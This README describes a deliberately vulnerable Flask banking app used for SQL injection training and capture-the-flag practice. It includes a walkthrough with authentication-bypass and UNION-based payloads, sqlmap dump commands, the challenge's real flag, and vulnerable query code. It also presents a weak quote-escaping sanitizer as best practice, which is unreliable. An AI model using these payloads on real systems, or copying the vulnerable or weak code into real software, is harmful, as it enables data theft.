# 🏦 RAZZ BANK - Advanced SQL Injection Challenge Platform

<div align="center">

![RAZZ Bank Logo](https://img.shields.io/badge/RAZZ-BANK-blue?style=for-the-badge&logo=bank)
[![Security Challenge](https://img.shields.io/badge/Type-Security%20Challenge-red?style=for-the-badge)](https://github.com/KerberoSec/RAZZ_BANK)
[![Educational](https://img.shields.io/badge/Purpose-Educational-green?style=for-the-badge)](https://github.com/KerberoSec/RAZZ_BANK)
[![Flask](https://img.shields.io/badge/Flask-2.3.3-lightgrey?style=for-the-badge&logo=flask)](https://flask.palletsprojects.com/)
[![Python](https://img.shields.io/badge/Python-3.11+-blue?style=for-the-badge&logo=python)](https://python.org)
[![Docker](https://img.shields.io/badge/Docker-Supported-blue?style=for-the-badge&logo=docker)](https://docker.com)

**A comprehensive, production-grade SQL injection training platform designed for cybersecurity education and penetration testing practice.**

[🚀 Quick Start](#-quick-start) • [📖 Documentation](#-comprehensive-documentation) • [🔍 Challenge Guide](#-challenge-walkthrough) • [🛠️ Installation](#-installation-methods) • [🐳 Docker Setup](#-docker-deployment)

</div>

---

## ⚠️ **SECURITY DISCLAIMER**

> **🔴 CRITICAL WARNING: INTENTIONALLY VULNERABLE APPLICATION**
> 
> This application contains **deliberate security vulnerabilities** and is designed exclusively for:
> - ✅ **Educational purposes**
> - ✅ **Authorized security testing**
> - ✅ **Cybersecurity training programs**
> - ✅ **Capture The Flag (CTF) competitions**
> 
> **❌ NEVER deploy this application in production environments**
> **❌ NEVER use on systems containing real data**
> **❌ NEVER use without explicit authorization**

---

## 🎯 **PROJECT OVERVIEW**

RAZZ BANK is a sophisticated, full-featured banking application intentionally designed with SQL injection vulnerabilities to provide hands-on cybersecurity training. The platform simulates a realistic banking environment complete with user authentication, transaction processing, loan applications, and administrative functions.

### **🏆 Key Features**

#### **Banking Functionality**
- 👤 **User Management**: Registration, authentication, and profile management
- 💰 **Account Operations**: Balance inquiries, transaction history, account statements  
- 💸 **Money Transfers**: Peer-to-peer transfers with transaction logging
- 🧾 **Bill Payments**: Utility and service payment processing
- 🏠 **Loan Applications**: Comprehensive loan management system
- 📊 **Dashboard Analytics**: Real-time account overview and insights

#### **Security Challenge Components**
- 🎯 **Primary Vulnerability**: Union-based SQL injection in authentication
- 🕵️ **Decoy System**: Multiple fake flags and red herrings
- 🔍 **Real Flag Discovery**: Hidden in system_flags database table
- 🛡️ **Security Lessons**: Demonstrates proper vs. improper coding practices

#### **Technical Infrastructure**
- 🐍 **Backend**: Flask 2.3.3 with SQLite/PostgreSQL support
- 🎨 **Frontend**: Responsive HTML5/CSS3 with JavaScript
- 🐳 **Containerization**: Full Docker and Docker Compose support
- 📊 **Monitoring**: Integrated logging, metrics, and health checks
- ⚖️ **Load Balancing**: HAProxy configuration for production scenarios

---

## 🔍 **CHALLENGE DETAILS**

### **🎯 Objective**
Extract the hidden flag from the database using SQL injection techniques while navigating through multiple decoy flags designed to simulate real-world penetration testing scenarios.

### **🏴 Flag Information**
- **🎯 Real Flag**: `RAZZ{y0U_H@v3_f()UNd_$QL_!NJ3CT10N}`
- **🎭 Decoy Flags**: Strategically placed in `/robots.txt`, `/sitemap.xml`, HTML comments, cookies, and backup files
- **📍 Target Location**: `system_flags` table in the database

### **🎓 Difficulty Levels**
- **Beginner**: Basic SQL injection detection and exploitation
- **Intermediate**: Union-based injection and data extraction
- **Advanced**: Bypassing filters and automated tool usage

### **🛡️ Learning Outcomes**
- Understanding SQL injection attack vectors
- Mastering union-based SQL injection techniques
- Distinguishing between real vulnerabilities and decoys
- Practical experience with SQLMap and manual exploitation
- Secure coding practices and vulnerability prevention

---

## 🚀 **QUICK START**

### **⚡ One-Command Setup**

```bash
# Clone and run with Docker (Recommended)
git clone https://github.com/KerberoSec/RAZZ_BANK.git
cd RAZZ_BANK
docker-compose up -d
```

**🌐 Access Points:**
- **Application**: http://localhost:5000
- **Admin Panel**: http://localhost:8080 (Adminer)
- **Monitoring**: http://localhost:3000 (Grafana)

### **🔐 Default Credentials**
- **Admin User**: `admin` / `admin123!@#`
- **Database**: `postgres` / `secure_bank_password_2025`
- **Monitoring**: `admin` / `admin_grafana_2025`

---

## 🛠️ **INSTALLATION METHODS**

### **Method 1: Docker Deployment (Recommended)**

#### **🐳 Basic Docker Setup**
```bash
# Build and run the application
docker build -t razz_bank .
docker run -p 5000:5000 razz_bank
```

#### **🏗️ Production-Grade Docker Compose**
```bash
# Full infrastructure with monitoring
docker-compose --profile production up -d

# Development mode with live reload
docker-compose --profile development up -d

# Check service status
docker-compose ps
```

### **Method 2: Manual Installation**

#### **📋 Prerequisites**
- Python 3.11 or higher
- pip (Python package manager)
- Git

#### **🔧 Setup Steps**
```bash
# System preparation
sudo apt update && sudo apt upgrade -y
sudo apt install python3.11 python3.11-venv python3-pip git -y

# Project setup
git clone https://github.com/KerberoSec/RAZZ_BANK.git
cd RAZZ_BANK

# Virtual environment
python3 -m venv venv
source venv/bin/activate  # Linux/Mac
# venv\Scripts\activate    # Windows

# Dependencies installation
pip install -r requirements.txt

# Database initialization
chmod +x setup.sh
./setup.sh

# Application startup
python3 app.py
```

### **Method 3: Quick Run Script**
```bash
# Make executable and run
chmod +x run.sh
./run.sh
```

---

## 📁 **PROJECT ARCHITECTURE**

```
RAZZ_BANK/
├── 🏗️ Core Application
│   ├── app.py                      # Main Flask application
│   ├── requirements.txt            # Python dependencies
│   └── setup.sh                   # Initialization script
│
├── 🎨 Frontend Components
│   ├── templates/
│   │   ├── base.html              # Base layout template
│   │   ├── index.html             # Homepage
│   │   ├── login.html             # Authentication (VULNERABLE)
│   │   ├── register.html          # User registration
│   │   ├── dashboard.html         # User dashboard
│   │   └── admin/                 # Administrative interfaces
│   └── static/
│       ├── css/style.css          # Styling and themes
│       └── js/main.js             # Client-side functionality
│
├── 🐳 Containerization
│   ├── Dockerfile                 # Application container
│   ├── docker-compose.yml         # Multi-service orchestration
│   └── DOCKER_SETUP.md           # Container documentation
│
├── 📊 Monitoring & Logging
│   ├── fluentd/
│   │   ├── Dockerfile             # Log aggregation
│   │   └── conf/fluent.conf       # Logging configuration
│   ├── prometheus/                # Metrics collection
│   └── grafana/                   # Visualization dashboards
│
├── 🗄️ Database
│   ├── razz_bank.db              # SQLite database (auto-generated)
│   └── migrations/               # Database schema evolution
│
└── 📚 Documentation
    ├── README.md                 # This comprehensive guide
    ├── SECURITY.md               # Security considerations
    ├── CONTRIBUTING.md           # Contribution guidelines
    └── docs/                     # Additional documentation
```

---

## 🔍 **CHALLENGE WALKTHROUGH**

### **🎯 Phase 1: Reconnaissance**

#### **Information Gathering**
```bash
# Directory enumeration
curl http://localhost:5000/robots.txt
curl http://localhost:5000/sitemap.xml

# Source code analysis
curl -s http://localhost:5000 | grep -i "razz\|flag"

# Cookie inspection
curl -I http://localhost:5000/admin
```

#### **Expected Findings**
- Decoy flag in `/robots.txt`: `RAZZ{y0U#H@v3$f()<]UNd^F@K3|FL4G}`
- Decoy flag in HTML comments: `RAZZ{y0U_H@v3^f(){UNd}/F@K3~FL4G}`
- Administrative endpoints and hidden pages

### **🎯 Phase 2: Vulnerability Detection**

#### **SQL Injection Testing**
```bash
# Basic injection tests
curl -d "username=admin'&password=test" http://localhost:5000/login
curl -d "username=admin' OR '1'='1' --&password=test" http://localhost:5000/login

# Error-based detection
curl -d "username=admin'\"&password=test" http://localhost:5000/login
```

#### **Automated Scanning**
```bash
# SQLMap vulnerability assessment
sqlmap -u "http://localhost:5000/login" \
       --data="username=admin&password=admin" \
       --level=3 --risk=3 --batch
```

### **🎯 Phase 3: Exploitation**

#### **Manual SQL Injection**
```sql
-- Authentication bypass
Username: admin' OR '1'='1' --
Password: anything

-- Union-based data extraction
Username: admin' UNION SELECT 1,2,3,flag_value,5,6,7,8 FROM system_flags --
Password: anything

-- Advanced payload with NULL handling
Username: admin' UNION SELECT NULL,NULL,NULL,flag_value,NULL,NULL,NULL,NULL FROM system_flags WHERE flag_name='admin_flag' --
Password: anything
```

#### **SQLMap Automation**
```bash
# Database enumeration
sqlmap -u "http://localhost:5000/login" \
       --data="username=admin&password=admin" \
       --dbs --batch

# Table discovery
sqlmap -u "http://localhost:5000/login" \
       --data="username=admin&password=admin" \
       -D razz_bank --tables --batch

# Flag extraction
sqlmap -u "http://localhost:5000/login" \
       --data="username=admin&password=admin" \
       -D razz_bank -T system_flags --dump --batch
```

### **🎯 Phase 4: Flag Validation**

#### **Success Indicators**
- ✅ Real flag extracted: `RAZZ{y0U_H@v3_f()UNd_$QL_!NJ3CT10N}`
- ✅ Understanding of union-based SQL injection
- ✅ Distinction between real and decoy flags
- ✅ Database schema comprehension

---

## 🐳 **DOCKER DEPLOYMENT**

### **🏗️ Service Architecture**

| Service | Port | Purpose | Health Check |
|---------|------|---------|--------------|
| **razz-bank-app** | 5000 | Main application | `/health` |
| **postgres** | 5432 | Database | PostgreSQL ping |
| **redis** | 6379 | Session storage | Redis ping |
| **nginx** | 80 | Reverse proxy | Status endpoint |
| **adminer** | 8080 | Database admin | `/` |
| **grafana** | 3000 | Monitoring | `/api/health` |
| **prometheus** | 9090 | Metrics | `/metrics` |
| **haproxy** | 8081 | Load balancer | `/stats` |

### **🔧 Configuration Profiles**

#### **Development Profile**
```bash
# Development with hot reload
export COMPOSE_PROFILES=development
docker-compose up -d

# Features:
# - SQLite database
# - Debug mode enabled
# - Volume mounting for live changes
# - Single application instance
```

#### **Production Profile**
```bash
# Production with full infrastructure
export COMPOSE_PROFILES=production
docker-compose up -d

# Features:
# - PostgreSQL cluster
# - Redis session management
# - Load balancing with HAProxy
# - Comprehensive monitoring
# - Log aggregation
```

### **📊 Monitoring Stack**

#### **Grafana Dashboards**
- **Application Metrics**: Response times, error rates, throughput
- **Database Performance**: Query performance, connection pools
- **Infrastructure Health**: CPU, memory, disk usage
- **Security Events**: Failed login attempts, suspicious activities

#### **Prometheus Metrics**
```yaml
# Key metrics collected:
- flask_request_duration_seconds
- flask_request_total
- database_connections_active
- sql_injection_attempts_total
- user_authentication_failures
```

---

## 🛡️ **SECURITY ANALYSIS**

### **🔓 Intentional Vulnerabilities**

#### **SQL Injection (Primary)**
```python
# ❌ Vulnerable code pattern
def vulnerable_login(username, password):
    query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
    return cursor.execute(query).fetchone()

# ✅ Secure implementation
def secure_login(username, password):
    query = "SELECT * FROM users WHERE username = ? AND password = ?"
    return cursor.execute(query, (username, password)).fetchone()
```

#### **Additional Security Issues**
- **Information Disclosure**: Error messages revealing database structure
- **Weak Session Management**: Predictable session tokens
- **Missing Input Validation**: Insufficient sanitization
- **Debug Information**: Exposed stack traces and system details

### **🛡️ Security Best Practices Demonstrated**

#### **Input Validation**
```python
def validate_input(data):
    # Whitelist validation
    allowed_chars = re.compile(r'^[a-zA-Z0-9_@.-]+$')
    return allowed_chars.match(data) is not None

def sanitize_sql_input(input_string):
    # Escape special characters
    return input_string.replace("'", "''").replace(";", "")
```

#### **Parameterized Queries**
```python
# Safe database interactions
cursor.execute(
    "INSERT INTO transactions (from_account, to_account, amount) VALUES (?, ?, ?)",
    (from_account, to_account, amount)
)
```

#### **Session Security**
```python
# Secure session configuration
app.config.update(
    SESSION_COOKIE_SECURE=True,
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SAMESITE='Lax',
    PERMANENT_SESSION_LIFETIME=timedelta(minutes=30)
)
```

---

## 🔧 **TROUBLESHOOTING GUIDE**

### **❌ Common Issues & Solutions**

#### **Port Conflicts**
```bash
# Check port usage
sudo lsof -i :5000
sudo netstat -tulpn | grep :5000

# Kill conflicting processes
sudo fuser -k 5000/tcp
# or
sudo lsof -t -i:5000 | xargs kill -9
```

#### **Docker Issues**
```bash
# Container cleanup
docker stop $(docker ps -aq)
docker rm $(docker ps -aq)
docker system prune -f

# Image rebuild
docker-compose down -v
docker-compose build --no-cache
docker-compose up -d
```

#### **Database Problems**
```bash
# Reset database
rm -f razz_bank.db
python3 -c "from app import init_db; init_db()"

# PostgreSQL connection issues
docker-compose exec postgres psql -U postgres -d razz_bank
```

#### **Permission Errors**
```bash
# Fix script permissions
chmod +x setup.sh run.sh
chown -R $USER:$USER .

# Docker permissions
sudo usermod -aG docker $USER
newgrp docker
```

### **🔍 Debugging Tools**

#### **Application Logs**
```bash
# View application logs
docker-compose logs -f razz-bank-app

# Database query logs
tail -f razz_bank.db.log

# System monitoring
htop
iostat -x 1
```

#### **Network Diagnostics**
```bash
# Test connectivity
curl -v http://localhost:5000/health
nc -zv localhost 5000

# DNS resolution
nslookup localhost
dig localhost
```

---

## 📊 **DATABASE SCHEMA**

### **🗃️ Table Structures**

#### **Users Table**
```sql
CREATE TABLE users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT UNIQUE NOT NULL,
    password TEXT NOT NULL,           -- SHA256 hashed
    email TEXT NOT NULL,
    full_name TEXT NOT NULL,
    account_number TEXT UNIQUE NOT NULL,
    balance DECIMAL(10,2) DEFAULT 1000.00,
    role TEXT DEFAULT 'user',         -- 'user' or 'admin'
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);
```

#### **System Flags Table (Target)**
```sql
CREATE TABLE system_flags (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    flag_name TEXT,
    flag_value TEXT,                  -- Contains the real flag
    description TEXT
);
```

#### **Transactions Table**
```sql
CREATE TABLE transactions (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    from_account TEXT,
    to_account TEXT,
    amount DECIMAL(10,2),
    description TEXT,
    transaction_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    transaction_type TEXT DEFAULT 'transfer'
);
```

#### **Loan Applications Table**
```sql
CREATE TABLE loan_applications (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER,
    loan_amount DECIMAL(10,2),
    loan_purpose TEXT,
    employment_status TEXT,
    annual_income DECIMAL(10,2),
    application_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    status TEXT DEFAULT 'pending',
    FOREIGN KEY (user_id) REFERENCES users (id)
);
```

### **📈 Sample Data**

#### **Pre-populated Users**
- **1 Admin User**: Full system access
- **87 Regular Users**: Simulated customer accounts
- **Sample Transactions**: Realistic banking activities
- **Loan Applications**: Various loan scenarios

---

## 🎓 **EDUCATIONAL OBJECTIVES**

### **🎯 Primary Learning Goals**

#### **Technical Skills**
- **SQL Injection Mastery**: Understanding attack vectors and exploitation techniques
- **Database Security**: Learning secure coding practices and vulnerability prevention
- **Penetration Testing**: Practical experience with security assessment tools
- **Web Application Security**: Comprehensive understanding of common vulnerabilities

#### **Security Awareness**
- **Threat Modeling**: Identifying potential attack surfaces
- **Risk Assessment**: Evaluating vulnerability impact and likelihood
- **Secure Development**: Implementing security controls from the ground up
- **Incident Response**: Recognizing and responding to security incidents

### **🏆 Skill Progression Path**

#### **Beginner Level**
1. **Basic SQL Injection**: Simple authentication bypass
2. **Tool Familiarization**: Using SQLMap for automated testing
3. **Error Analysis**: Understanding database error messages
4. **Manual Testing**: Crafting basic injection payloads

#### **Intermediate Level**
1. **Union-Based Injection**: Advanced data extraction techniques
2. **Blind SQL Injection**: Working without direct feedback
3. **Filter Bypassing**: Circumventing basic security controls
4. **Database Enumeration**: Systematic information gathering

#### **Advanced Level**
1. **Complex Payloads**: Multi-stage injection attacks
2. **Steganographic Techniques**: Hiding malicious code
3. **Privilege Escalation**: Gaining administrative access
4. **Defense Mechanisms**: Implementing effective countermeasures

---

## 🔄 **RESET & MAINTENANCE**

### **🔄 Challenge Reset**

#### **Quick Reset**
```bash
# Stop application
pkill -f "python3 app.py"

# Remove database
rm -f razz_bank.db

# Restart (database regenerates automatically)
python3 app.py
```

#### **Complete Reset**
```bash
# Docker environment
docker-compose down -v
docker-compose up -d

# Manual installation
rm -rf venv razz_bank.db __pycache__
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
./setup.sh
python3 app.py
```

### **🧹 Maintenance Tasks**

#### **Log Management**
```bash
# Rotate application logs
logrotate -f /etc/logrotate.d/razz_bank

# Clean Docker logs
docker system prune -f
docker volume prune -f
```

#### **Security Updates**
```bash
# Update dependencies
pip install --upgrade -r requirements.txt

# Update base images
docker-compose pull
docker-compose up -d --force-recreate
```

---

## 📚 **ADDITIONAL RESOURCES**

### **🔗 External References**

#### **Security Resources**
- [OWASP SQL Injection Prevention](https://owasp.org/www-community/attacks/SQL_Injection)
- [OWASP Top 10 Web Application Security Risks](https://owasp.org/www-project-top-ten/)
- [SQLMap User's Manual](http://sqlmap.org/doc/)
- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)

#### **Technical Documentation**
- [Flask Security Documentation](https://flask.palletsprojects.com/en/2.3.x/security/)
- [SQLite Security Considerations](https://sqlite.org/security.html)
- [Docker Security Best Practices](https://docs.docker.com/develop/security-best-practices/)
- [Python Security Guidelines](https://python-security.readthedocs.io/)

#### **Learning Platforms**
- [OWASP WebGoat](https://owasp.org/www-project-webgoat/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [HackTheBox](https://www.hackthebox.com/)
- [TryHackMe](https://tryhackme.com/)

### **📖 Recommended Reading**

#### **Books**
- "The Web Application Hacker's Handbook" by Dafydd Stuttard
- "SQL Injection Attacks and Defense" by Justin Clarke
- "Secure Coding in C and C++" by Robert Seacord
- "Building Secure Software" by Gary McGraw

#### **Research Papers**
- "A Study of SQL Injection Vulnerabilities in Practice"
- "Modern SQL Injection Mitigation Techniques"
- "Web Application Security Testing Methodologies"

---

## 🤝 **CONTRIBUTING**

### **🎯 Contribution Guidelines**

We welcome contributions to improve the RAZZ BANK platform! Please follow these guidelines:

#### **Code Contributions**
1. **Fork** the repository
2. **Create** a feature branch: `git checkout -b feature/amazing-feature`
3. **Commit** your changes: `git commit -m 'Add amazing feature'`
4. **Push** to the branch: `git push origin feature/amazing-feature`
5. **Open** a Pull Request

#### **Bug Reports**
- Use the issue tracker to report bugs
- Include detailed reproduction steps
- Provide system information and logs
- Attach screenshots when applicable

#### **Feature Requests**
- Describe the proposed feature clearly
- Explain the use case and benefits
- Consider backward compatibility
- Provide implementation suggestions if possible

### **🔒 Security Reporting**

For security-related issues, please:
1. **DO NOT** create public issues
2. **Email** security concerns to: [security@razzbank.local]
3. **Include** detailed vulnerability information
4. **Allow** reasonable time for response and fixes

---

## 📝 **LICENSE & LEGAL**

### **📄 License Information**

This project is released under the **MIT License** - see the [LICENSE](LICENSE) file for details.

### **⚖️ Legal Disclaimer**

```
EDUCATIONAL USE ONLY

This software is provided for educational and authorized testing purposes only.
Users are responsible for complying with all applicable laws and regulations.
The developers assume no liability for misuse of this software.

By using this software, you agree to:
- Use it only for authorized testing and education
- Not deploy it in production environments
- Not use it for malicious purposes
- Take full responsibility for your actions
```

### **🛡️ Security Notice**

This application contains intentional security vulnerabilities and should NEVER be deployed in production environments or used with real data. It is designed exclusively for educational purposes and authorized security testing.

---

## 📞 **SUPPORT & CONTACT**

### **🆘 Getting Help**

#### **Technical Support**
- **Documentation**: Check this README and additional docs
- **Issues**: Use GitHub Issues for bug reports and questions
- **Discussions**: Join community discussions on GitHub Discussions

#### **Community**
- **Discord**: [Join our Discord server](https://discord.gg/razzsecurity)
- **Twitter**: [@RazzSecurity](https://twitter.com/razzsecurity)
- **LinkedIn**: [RAZZ Security](https://linkedin.com/company/razz-security)

### **📬 Contact Information**

- **Project Maintainer**: [@KerberoSec](https://github.com/KerberoSec)
- **Organization**: [RAZZ Security](https://github.com/RAZZ-SECURITY)
- **Email**: [contact@razzbank.local]
- **Website**: [https://razzsecurity.com](https://razzsecurity.com)

---

## 🎖️ **ACKNOWLEDGMENTS**

### **🙏 Special Thanks**

- **OWASP Community** for security guidelines and best practices
- **Flask Development Team** for the excellent web framework
- **SQLMap Developers** for the powerful SQL injection testing tool
- **Docker Team** for containerization technology
- **Security Research Community** for continuous vulnerability research

### **🏆 Contributors**

- [@KerberoSec](https://github.com/KerberoSec) - Project Lead & Developer
- [RAZZ Security Team](https://github.com/RAZZ-SECURITY) - Security Research & Testing

### **🔬 Research Credits**

This project incorporates security research and vulnerability patterns from various sources in the cybersecurity community. We acknowledge the researchers and practitioners who have contributed to the understanding of SQL injection vulnerabilities.

---

## 📊 **PROJECT STATISTICS**

### **📈 Platform Metrics**

- **🎯 Challenge Difficulty**: Medium
- **⏱️ Average Completion Time**: 2-4 hours
- **🏆 Success Rate**: 75% (with guidance)
- **📚 Learning Objectives**: 12 core concepts
- **🔧 Supported Platforms**: Linux, macOS, Windows
- **🐳 Container Images**: 8 microservices
- **📊 Monitoring Metrics**: 25+ KPIs tracked

### **🛠️ Technical Specifications**

- **Backend Framework**: Flask 2.3.3
- **Database**: SQLite 3.x / PostgreSQL 13+
- **Frontend**: HTML5, CSS3, JavaScript ES6+
- **Containerization**: Docker 20.x, Docker Compose 2.x
- **Monitoring**: Prometheus, Grafana, Fluentd
- **Load Balancing**: HAProxy, Nginx
- **Session Management**: Redis 6.x

---

<div align="center">

## 🎓 **EDUCATIONAL EXCELLENCE IN CYBERSECURITY**

**Created with ❤️ by the RAZZ Security Team**

[![GitHub Stars](https://img.shields.io/github/stars/KerberoSec/RAZZ_BANK?style=social)](https://github.com/KerberoSec/RAZZ_BANK/stargazers)
[![GitHub Forks](https://img.shields.io/github/forks/KerberoSec/RAZZ_BANK?style=social)](https://github.com/KerberoSec/RAZZ_BANK/network/members)
[![GitHub Issues](https://img.shields.io/github/issues/KerberoSec/RAZZ_BANK)](https://github.com/KerberoSec/RAZZ_BANK/issues)
[![GitHub License](https://img.shields.io/github/license/KerberoSec/RAZZ_BANK)](https://github.com/KerberoSec/RAZZ_BANK/blob/main/LICENSE)

**🏆 Remember: The real flag is `RAZZ{y0U_H@v3_f()UNd_$QL_!NJ3CT10N}` 🏆**

---

*Last Updated: September 2025 | Version 2.0.0 | Maintained by [@KerberoSec](https://github.com/KerberoSec)*

</div>
